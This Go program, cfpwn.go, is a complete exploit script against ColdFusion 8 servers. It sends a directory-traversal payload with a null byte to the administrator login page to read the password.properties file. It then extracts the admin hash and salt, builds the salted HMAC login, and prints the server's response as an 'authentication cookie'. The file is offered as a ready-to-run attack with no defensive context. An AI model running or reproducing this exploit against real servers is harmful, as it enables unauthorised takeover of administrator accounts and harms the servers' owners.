package main

import (
	"crypto/hmac"
	"crypto/sha1"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"regexp"
	"strings"
)

// usage prints usage information
func usage() {
	fmt.Println("cfpwn.go exploits a directory traversal flaw in ColdFusion servers")
	fmt.Println("to get the admin password hash and salt. The script then logs in ")
	fmt.Println("to the server and gets the authentication cookie.")
	fmt.Println()
	fmt.Println("Usage: cfpwn.go server port")
}

// hmacSHA1 generates HMAC-SHA1 hash
func hmacSHA1(key, data string) string {
	h := hmac.New(sha1.New, []byte(key))
	h.Write([]byte(data))
	return hex.EncodeToString(h.Sum(nil))
}

// getPasswordAndSalt extracts password and salt from the response using regex
func getPasswordAndSalt(data string) (string, string, error) {
	// Extract password
	rePassword := regexp.MustCompile(`<title>.*password=([A-F0-9]+).*<\/title>`)
	passwordMatches := rePassword.FindStringSubmatch(data)
	if len(passwordMatches) < 2 {
		return "", "", fmt.Errorf("password not found")
	}
	password := passwordMatches[1]

	// Extract salt
	reSalt := regexp.MustCompile(`<input name="salt" type="hidden" value="(\d+)"\>`)
	saltMatches := reSalt.FindStringSubmatch(data)
	if len(saltMatches) < 2 {
		return "", "", fmt.Errorf("salt not found")
	}
	salt := saltMatches[1]

	return password, salt, nil
}

// makeRequest sends an HTTP POST request and returns the response body
func makeRequest(url string, data string, headers map[string]string) (string, error) {
	client := &http.Client{}
	req, err := http.NewRequest("POST", url, strings.NewReader(data))
	if err != nil {
		return "", err
	}

	// Set headers
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func main() {
	// Command-line arguments
	flag.Parse()
	args := flag.Args()

	if len(args) != 2 {
		usage()
		return
	}

	server := args[0]
	port := args[1]

	url := fmt.Sprintf("http://%s:%s/CFIDE/administrator/enter.cfm", server, port)
	locale := "locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en"

	// Exploit directory traversal to get password.properties file
	headers := map[string]string{
		"Host":         server,
		"Content-Type": "application/x-www-form-urlencoded",
		"Content-Length": fmt.Sprintf("%d", len(locale)),
	}

	responseData, err := makeRequest(url, locale, headers)
	if err != nil {
		log.Fatalf("[-] Error during directory traversal request: %v", err)
	}

	// Extract the password and salt from the response
	password, salt, err := getPasswordAndSalt(responseData)
	if err != nil {
		log.Fatalf("[-] Error extracting password and salt: %v", err)
	}

	// Generate HMAC-SHA1 hash with salt
	hash := hmacSHA1(salt, password)

	// Create login data with salted hash
	loginData := fmt.Sprintf("cfadminPassword=%s&requestedURL=%%2FCFIDE%%2Fadministrator%%2Fenter.cfm%%3F&salt=%s&submit=Login", strings.ToUpper(hash), salt)
	loginHeaders := map[string]string{
		"Host": server,
	}

	// Login and retrieve authentication cookie
	resp, err := makeRequest(url, loginData, loginHeaders)
	if err != nil {
		log.Fatalf("[-] Error during login request: %v", err)
	}

	// Output the authentication cookie
	fmt.Println("Authentication Cookie:", resp)
}

